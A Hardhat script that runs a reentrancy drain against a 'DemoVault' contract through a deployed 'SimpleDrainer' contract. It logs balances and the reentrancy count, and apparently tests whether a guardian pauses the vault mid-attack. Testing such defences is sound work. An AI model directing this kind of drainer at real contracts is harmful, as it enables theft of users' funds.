const hre = require("hardhat");

const CONFIG = {
  DEMO_VAULT: "0x22650892Ce8db57fCDB48AE8b3508F52420A727A",
  SIMPLE_DRAINER: "0xE1E59cB4d2D4caFDb966B77fA76D775f344471ab",
};

async function main() {
  const [attacker] = await hre.ethers.getSigners();
  console.log("Attacker:", attacker.address);
  
  // Get contract instances
  const vault = await hre.ethers.getContractAt("DemoVault", CONFIG.DEMO_VAULT);
  const drainer = await hre.ethers.getContractAt("SimpleDrainer", CONFIG.SIMPLE_DRAINER);
  
  // Check vault state
  const vaultBal = await hre.ethers.provider.getBalance(CONFIG.DEMO_VAULT);
  console.log("Vault balance:", hre.ethers.formatEther(vaultBal), "ETH");
  
  const paused = await vault.paused();
  console.log("Vault paused:", paused);
  
  if (paused) {
    console.log("\n⚠️  Vault is already paused! Cannot attack.");
    return;
  }
  
  console.log("\n⚔️  Executing attack...");
  
  // Execute attack - deposit 0.001 ETH, try to drain 0.001 ETH per iteration
  const attackAmount = hre.ethers.parseEther("0.001");
  
  try {
    const tx = await drainer.attack(attackAmount, { 
      value: attackAmount,
      gasLimit: 500000 
    });
    console.log("Attack tx:", tx.hash);
    
    const receipt = await tx.wait();
    console.log("✅ Attack confirmed in block", receipt.blockNumber);
    
    // Check results
    const vaultBalAfter = await hre.ethers.provider.getBalance(CONFIG.DEMO_VAULT);
    const drainerBal = await hre.ethers.provider.getBalance(CONFIG.SIMPLE_DRAINER);
    const drainCount = await drainer.drainCount();
    const pausedAfter = await vault.paused();
    
    console.log("\n📊 Results:");
    console.log("  Vault balance after:", hre.ethers.formatEther(vaultBalAfter), "ETH");
    console.log("  Drainer balance:", hre.ethers.formatEther(drainerBal), "ETH");
    console.log("  Reentrancy count:", drainCount.toString());
    console.log("  Vault paused:", pausedAfter);
    
    if (pausedAfter && !paused) {
      console.log("\n🛡️  GUARDIAN PAUSED THE VAULT!");
    }
    
  } catch (error) {
    console.error("\n❌ Attack failed:", error.message);
    
    // Check if paused mid-attack
    const pausedNow = await vault.paused();
    if (pausedNow) {
      console.log("\n🛡️  GUARDIAN PAUSED THE VAULT MID-ATTACK!");
    }
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
